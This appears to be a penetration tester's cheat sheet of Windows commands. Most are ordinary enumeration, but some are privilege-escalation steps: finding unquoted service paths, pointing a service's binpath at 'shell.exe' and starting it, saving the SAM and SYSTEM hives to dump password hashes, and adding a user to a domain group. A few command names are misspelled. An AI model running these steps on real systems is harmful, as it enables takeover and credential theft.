# dos commands

## see running service processes
tasklist /SVC

```powershell
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

## windows services and drivers
net start

## service paths
https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths
```dos
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## installed drivers
driverquery

## active network connections
netstat -ano

## show environment variables
set

## file permissions
calcs file.exe
icalcs file.exe

### access check sysinternals
upload accesschk.exe
```dos
ac.exe /accepteula -uwcqv "Authenticated Users" *
```

## services sc

### enable service
set to auto start
sc config SVC_NAME start= auto

### set binary path
sc config SVC_NAME binpath= "c:\inetpub\shell.exe"

### start service
net start SVC_NAME

## kill process by id
taskkill /f /pid 1234

## admin / system
### dump registry secretsdump hashes
reg save HKLM\sam sam
reg save HKLM\system system

## net

### add user to domain group
net group GroupName UserName /domain /add
